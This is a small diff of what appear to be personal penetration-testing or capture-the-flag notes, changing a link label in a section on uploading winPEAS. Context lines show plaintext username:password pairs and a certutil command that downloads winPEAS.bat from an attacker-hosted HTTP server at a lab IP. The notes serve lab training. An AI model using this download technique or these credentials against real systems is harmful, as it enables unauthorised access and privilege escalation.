@@ -130,7 +130,7 @@ Bob:!P@$$W0rD!123
 Bill:Juw4nnaM4n420696969!$$$ 
 ```
 ## uploading winpeas:
-- made a [[python server creation]] and did this with [[certutil]] 
+- made a [[python http server creation]] and did this with [[certutil]] 
 ```sh
 certutil -urlcache -f http://10.21.154.145:8084/winPEAS.bat winPEAS.bat
 ```
